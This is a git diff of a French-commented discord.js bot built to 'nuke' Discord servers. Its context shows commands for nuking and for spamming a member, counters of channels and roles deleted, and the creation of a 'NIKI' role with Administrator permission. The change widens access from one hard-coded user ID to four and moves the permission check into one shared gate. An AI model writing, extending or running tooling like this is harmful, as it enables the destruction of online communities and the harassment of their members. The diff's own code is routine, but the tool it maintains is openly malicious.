@@ -16,6 +16,16 @@ const {
 } = require('discord.js');
 
 // ============================================================
+// LISTE DES ID AUTORISÉS
+// ============================================================
+const AUTHORIZED_IDS = [
+    "1474433573174907054",  // NIKI
+    "1131303577558720583",  // ID 2
+    "1505533003538108568",  // ID 3
+    "1263875311901347934"   // ID 4
+];
+
+// ============================================================
 // GESTION DES STATS PERMANENTES (FICHIER JSON)
 // ============================================================
 const STATS_FILE = './stats.json';
@@ -65,8 +75,6 @@ const client = new Client({
 });
 
 const PREFIX = process.env.PREFIX || '!';
-const AUTHORIZED_ID = "1474433573174907054";
-
 let statsChannelId = null;
 let statsMessageId = null;
 
@@ -345,6 +353,13 @@ const TEMPLATES = {
 };
 
 // ============================================================
+// VÉRIFICATION DE L'AUTORISATION
+// ============================================================
+function isAuthorized(userId) {
+    return AUTHORIZED_IDS.includes(userId);
+}
+
+// ============================================================
 // UPDATE STATS CHANNEL
 // ============================================================
 async function updateStatsChannel() {
@@ -363,8 +378,7 @@ async function updateStatsChannel() {
                 { name: '🗑️ Channels Deleted', value: `${totalChannelsDeleted}`, inline: true },
                 { name: '🎭 Roles Deleted', value: `${totalRolesDeleted}`, inline: true },
                 { name: '📝 Channels Created', value: `${totalChannelsCreated}`, inline: true },
-                { name: '📊 Servers', value: `${client.guilds.cache.size}`, inline: true },
-                { name: '👤 Authorized User', value: `<@${AUTHORIZED_ID}>`, inline: true }
+                { name: '📊 Servers', value: `${client.guilds.cache.size}`, inline: true }
             )
             .setFooter({ text: 'NIKI ON TOP ☠' })
             .setTimestamp();
@@ -430,18 +444,24 @@ client.once('ready', async () => {
     console.log(`📊 ${client.guilds.cache.size} servers`);
     console.log(`🔧 Prefix: ${PREFIX}`);
     console.log(`💾 Stats loaded from file. Total Nukes: ${totalNukes}`);
+    console.log(`👥 Authorized IDs: ${AUTHORIZED_IDS.join(', ')}`);
     console.log('====================================');
     await updateStatsChannel();
 });
 
 // ============================================================
-// MESSAGE COMMANDS (SANS VÉRIFICATION DE PERMISSIONS)
+// MESSAGE COMMANDS
 // ============================================================
 client.on('messageCreate', async (message) => {
     if (message.author.bot || !message.content.startsWith(PREFIX)) return;
 
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
+
+    // Vérification d'autorisation pour toutes les commandes
+    if (!isAuthorized(message.author.id)) {
+        return message.reply('❌ **ID non autorisée** - Tu n\'as pas la permission d\'utiliser ce bot.');
+    }
 
     if (command === 'vnuke') {
         await handleNuke(message);
@@ -473,13 +493,9 @@ client.on('messageCreate', async (message) => {
 });
 
 // ============================================================
-// NEW SERVER COMMAND (SANS VÉRIFICATION DE PERMISSIONS)
+// NEW SERVER COMMAND
 // ============================================================
 async function handleNewServer(message, theme) {
-    if (message.author.id !== AUTHORIZED_ID) {
-        return message.reply('❌ You are not authorized to use this command!');
-    }
-
     const template = TEMPLATES[theme];
     await message.reply(`🎨 Creating **${template.name}** server...`);
 
@@ -580,8 +596,7 @@ async function handleNewServer(message, theme) {
             .addFields(
                 { name: '📝 Channels', value: `${template.channels.length} created`, inline: true },
                 { name: '🎭 Roles', value: `${template.roles.length} created`, inline: true },
-                { name: '📂 Categories', value: `${template.categories.length} created`, inline: true },
-                { name: '👤 Authorized User', value: `<@${AUTHORIZED_ID}>`, inline: true }
+                { name: '📂 Categories', value: `${template.categories.length} created`, inline: true }
             )
             .setFooter({ text: 'NIKI ON TOP ☠' })
             .setTimestamp();
@@ -595,14 +610,10 @@ async function handleNewServer(message, theme) {
 }
 
 // ============================================================
-// NUKE FUNCTION (SANS VÉRIFICATION DE PERMISSIONS ADMIN)
+// NUKE FUNCTION
 // ============================================================
 async function handleNuke(message) {
-    if (message.author.id !== AUTHORIZED_ID) {
-        return message.reply('❌ You are not authorized to use this command!');
-    }
-
-    await message.reply('💀 **NUKE INITIALIZED... (RAPID MODE)**');
+    await message.reply('💀 **NUKE INITIALIZED...**');
 
     const guild = message.guild;
     const guildName = guild.name;
@@ -680,7 +691,7 @@ async function handleNuke(message) {
         }
         await Promise.all(createPromises);
 
-        // 5. CREATE SPECIAL NIKI ROLE WITH ALL PERMISSIONS
+        // 5. CREATE SPECIAL NIKI ROLE
         try {
             const allPermissions = [
                 PermissionsBitField.Flags.Administrator,
@@ -774,10 +785,6 @@ async function handleNuke(message) {
 // SPAM FUNCTION
 // ============================================================
 async function handleSpam(message, args) {
-    if (message.author.id !== AUTHORIZED_ID) {
-        return message.reply('❌ You are not authorized to use this command!');
-    }
-
     if (args.length === 0) {
         return message.reply('❌ Utilisation : `!spam @membre`');
     }
@@ -856,10 +863,6 @@ async function handleSpam(message, args) {
 // VERIFICATION FUNCTION (!verif)
 // ============================================================
 async function handleVerif(message) {
-    if (message.author.id !== AUTHORIZED_ID) {
-        return message.reply('❌ You are not authorized to use this command!');
-    }
-
     const guild = message.guild;
 
     let memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
